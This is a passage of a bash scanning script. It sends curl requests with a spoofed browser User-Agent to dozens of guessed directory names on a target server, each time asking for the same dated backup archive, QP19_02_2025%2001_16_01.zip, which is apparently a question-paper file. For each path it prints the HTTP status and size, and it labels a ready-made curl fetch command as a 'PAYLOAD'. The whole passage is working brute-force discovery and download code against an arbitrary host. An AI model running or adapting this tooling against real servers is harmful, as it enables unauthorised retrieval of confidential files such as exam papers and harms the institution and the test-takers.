code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
